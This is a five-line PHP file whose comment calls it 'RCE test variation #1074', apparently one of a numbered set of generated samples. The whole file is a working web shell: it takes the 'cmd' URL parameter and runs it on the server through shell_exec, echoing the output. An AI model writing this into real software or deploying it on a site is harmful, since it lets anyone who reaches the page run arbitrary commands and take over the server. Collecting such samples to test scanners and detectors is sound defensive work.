<?php
// RCE test variation #1074
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>